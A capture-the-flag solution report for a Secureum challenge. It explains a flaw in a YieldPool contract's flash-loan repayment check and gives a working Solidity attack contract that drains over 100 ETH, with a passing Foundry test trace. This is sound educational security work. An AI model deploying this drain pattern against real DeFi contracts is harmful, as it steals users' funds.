# Challenge 6: Safe Yield - Solution Report

## Problem Overview

### Contract Summary

The challenge revolves around two main contracts:

1. `SecureumToken`: A simple ERC20 token contract.

2. `YieldPool`: A yield-generating pool contract that:
   - Allows users to add and remove liquidity in ETH and SecureumToken pairs.
   - Implements a DEX-like swap functionality between ETH and SecureumToken.
   - Provides flash loan capabilities for both ETH and SecureumToken.

Key functions in `YieldPool`:

- `addLiquidity()`: Adds liquidity to the pool.
- `removeLiquidity()`: Removes liquidity from the pool.
- `ethToToken()`: Swaps ETH for SecureumToken.
- `tokenToEth()`: Swaps SecureumToken for ETH.
- `flashLoan()`: Provides flash loan functionality.

### Initial Setup

- The pool is initialized with 10,000 ETH and 10,000 SecureumToken.
- The attacker starts with 0.1 ETH.

### Success Criteria

To solve the challenge, the attacker must:

- Drain at least 100 ETH from the yield pool.

## Vulnerability

The main vulnerability in the YieldPool contract lies in the implementation of the `flashLoan()` function, specifically in how it checks for loan repayment when the borrowed asset is ETH. The vulnerable code is in the following lines of the `flashLoan()` function in YieldPool.sol:

```solidity
if (token == ETH) {
    expected = address(this).balance + flashFee(token, amount);
    (bool success,) = address(receiver).call{value: amount}("");
    require(success, "ETH transfer failed");
    success = false;
}
```

And later in the same function:

```solidity
if (token == ETH) {
    require(address(this).balance >= expected, "Flash loan not repayed");
}
```

This implementation is vulnerable because:

1. It only checks the contract's ETH balance at the end of the transaction to determine if the loan has been repaid.
2. It doesn't account for the possibility that the borrower could manipulate the contract's ETH balance within the same transaction.
3. There's no mechanism to ensure that the repayment comes from the borrower's external funds rather than from interactions with the contract itself.

This vulnerability allows a malicious actor to potentially exploit the flash loan mechanism without actually repaying the loan from their own funds.

## Attack Process

The attack exploits the vulnerability in the `flashLoan()` function of the YieldPool contract. The process is as follows:

1. Deploy the attack contract:

   - The attacker deploys a contract that implements the `IERC3156FlashBorrower` interface.
   - This contract is designed to interact with the YieldPool contract.

2. Initiate the attack:

   - The attacker calls the `attack()` function of the attack contract with a small amount of ETH (0.1 ETH in this case).

3. Execute flash loans in a loop:

   - The attack contract requests a flash loan from the YieldPool for an amount of ETH that is 100 times its current balance.
   - This process is repeated in a loop until the attack contract's balance exceeds 100 ETH.

4. During each flash loan:

   - In the `onFlashLoan()` callback function, the attack contract immediately uses all of its ETH balance (which includes the flash loan amount) to buy tokens using the `ethToToken()` function of YieldPool.
   - This action satisfies the repayment condition for the flash loan, as the YieldPool's ETH balance is now sufficient.
   - However, the attack contract now holds tokens without actually repaying the loan from external funds.

5. After each flash loan:

   - The attack contract exchanges the tokens it received for ETH using the `tokenToEth()` function of YieldPool.
   - This increases the ETH balance of the attack contract.

6. Repeat the process:

   - Steps 3-5 are repeated, with each iteration allowing for a larger flash loan due to the increased ETH balance.

7. Finalize the attack:
   - Once the attack contract's balance exceeds 100 ETH, the loop ends.
   - The accumulated ETH is then transferred to the attacker's address.

This process allows the attacker to drain a significant amount of ETH from the YieldPool without actually providing any funds beyond the initial 0.1 ETH. The key to this attack is the ability to use the flash loan itself to satisfy the repayment condition, effectively getting "free" tokens with each iteration.

## Proof of Concept (PoC)

### Core Implementation

The core of the attack is implemented in the `YieldPoolAttack` contract. Here are the key parts of the implementation:

1. Contract setup:

```solidity
contract YieldPoolAttack is IERC3156FlashBorrower {
    YieldPool public yieldPool;
    SecureumToken public token;
    address public owner;

    constructor(YieldPool _yieldPool, SecureumToken _token) {
        yieldPool = _yieldPool;
        token = _token;
        owner = msg.sender;
    }
```

2. Flash loan callback function:

```solidity
function onFlashLoan(address initiator, address, uint256 amount, uint256 fee, bytes calldata data)
    external
    override
    returns (bytes32)
{
    require(msg.sender == address(yieldPool), "Untrusted lender");
    require(initiator == address(this), "Untrusted loan initiator");

    // Use all ETH for buying Tokens while paying the loan
    yieldPool.ethToToken{value: address(this).balance}();

    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

3. Main attack function:

```solidity
function attack() external payable {
    require(msg.sender == owner, "Only owner can execute attack");

    while (address(this).balance <= 100 ether) {
        // 1. Flash loan as much ETH as we can afford
        uint256 flashLoanAmount = address(this).balance * 100;
        yieldPool.flashLoan(this, yieldPool.ETH(), flashLoanAmount, "");

        // 2. Exchange Tokens for ETH
        uint256 tokenBalance = token.balanceOf(address(this));
        token.approve(address(yieldPool), tokenBalance);
        yieldPool.tokenToEth(tokenBalance);
    }

    // Send profits back to the owner
    (bool success,) = owner.call{value: address(this).balance}("");
    require(success, "Transfer failed");
}
```

This implementation exploits the vulnerability by repeatedly taking flash loans, using the borrowed ETH to buy tokens (which satisfies the repayment condition), and then converting those tokens back to ETH. This process is repeated until the attack contract has accumulated over 100 ETH.

### Running Result

```
Ran 1 test for test/Challenge6.t.sol:Challenge6Test
[PASS] testExploitPool() (gas: 589457)
Traces:
  [674657] Challenge6Test::testExploitPool()
    ├─ [0] VM::startPrank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Return]
    ├─ [433955] → new YieldPoolAttack@0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a
    │   └─ ← [Return] 1834 bytes of code
    ├─ [191003] YieldPoolAttack::attack{value: 100000000000000000}()
    │   ├─ [327] YieldPool::ETH() [staticcall]
    │   │   └─ ← [Return] 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE
    │   ├─ [51589] YieldPool::flashLoan(YieldPoolAttack: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, 10000000000000000000 [1e19], 0x)
    │   │   ├─ [55] YieldPoolAttack::receive{value: 10000000000000000000}()
    │   │   │   └─ ← [Stop]
    │   │   ├─ [42610] YieldPoolAttack::onFlashLoan(YieldPoolAttack: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, 10000000000000000000 [1e19], 100000000000000000 [1e17], 0x)
    │   │   │   ├─ [34554] YieldPool::ethToToken{value: 10100000000000000000}()
    │   │   │   │   ├─ [2562] SecureumToken::balanceOf(YieldPool: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 10000000000000000000000 [1e22]
    │   │   │   │   ├─ [27838] SecureumToken::transfer(YieldPoolAttack: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 9999000999900099990 [9.999e18])
    │   │   │   │   │   ├─ emit Transfer(from: YieldPool: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: YieldPoolAttack: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 9999000999900099990 [9.999e18])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9
    │   │   └─ ← [Return] true

...

    │   ├─ [14989] YieldPool::tokenToEth(990802620485533746248 [9.908e20])
    │   │   ├─ [562] SecureumToken::balanceOf(YieldPool: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   └─ ← [Return] 9009197379514466253752 [9.009e21]
    │   │   ├─ [5822] SecureumToken::transferFrom(YieldPoolAttack: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], YieldPool: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 990802620485533746248 [9.908e20])
    │   │   │   ├─ emit Approval(owner: YieldPoolAttack: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], spender: YieldPool: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 0)
    │   │   │   ├─ emit Transfer(from: YieldPoolAttack: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: YieldPool: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 990802620485533746248 [9.908e20])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [55] YieldPoolAttack::receive{value: 981877249778697077593}()
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ [0] attacker::fallback{value: 981877249778697077593}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    └─ ← [Stop]
```
